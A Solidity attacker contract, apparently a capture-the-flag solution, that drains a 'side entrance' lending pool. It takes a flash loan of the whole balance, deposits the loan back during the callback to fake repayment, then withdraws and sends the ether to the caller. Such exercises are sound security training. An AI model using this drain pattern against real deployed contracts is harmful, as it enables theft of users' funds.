pragma solidity ^0.6.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker {

    SideEntranceLenderPool Pool;
    address payable Creator;

    constructor(address payable _pool) public {
        Pool = SideEntranceLenderPool(_pool);
        Creator = msg.sender;
    }

    function execute() external payable {
        Pool.deposit{value: msg.value}();
    }

    function flashLoan() external {
        uint256 _amount = address(Pool).balance;
        Pool.flashLoan(_amount);
        Pool.withdraw();
        bool sent = msg.sender.send(address(this).balance);
        require(sent, "Failed to send Ether");
    }

    receive() external payable {}
}
